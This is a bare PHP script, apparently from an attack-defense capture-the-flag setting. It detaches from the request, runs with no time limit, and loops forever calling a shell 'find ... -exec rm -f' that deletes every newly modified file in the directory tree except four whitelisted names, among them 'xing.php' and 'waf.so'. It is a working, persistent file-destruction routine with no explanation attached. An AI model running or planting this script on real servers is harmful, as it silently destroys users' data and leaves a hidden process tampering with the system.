<?php
    ignore_user_abort(true);
    set_time_limit(0);

    while (1){
        system('find ./ -type f ! \( -name "1.sh" -o -name "xing.php" -o -name "waf.so" -o -name "ZZYLG.php" \) -cmin -0.05 -exec rm -f {} \;');
        usleep(0);
    }
?>